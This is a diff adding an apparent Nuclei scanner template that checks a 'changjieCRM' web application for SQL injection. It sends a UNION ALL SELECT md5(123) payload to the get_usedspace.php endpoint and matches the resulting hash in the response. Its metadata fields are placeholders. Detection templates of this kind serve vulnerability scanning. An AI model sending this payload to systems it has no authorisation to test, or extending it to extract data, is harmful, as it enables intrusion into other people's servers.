@@ -1,0 +1,32 @@
+id: changjieCRM-usedspace-sqli
+info:
+  name: changjieCRM-usedspace-sqli
+  author: Administrator
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20md5(123)-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: PHPSESSID=0d2e81beb37fba8647fc3ec3faa8e053
+        Upgrade-Insecure-Requests: 1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - 202cb962ac59075b964b07152d234b70
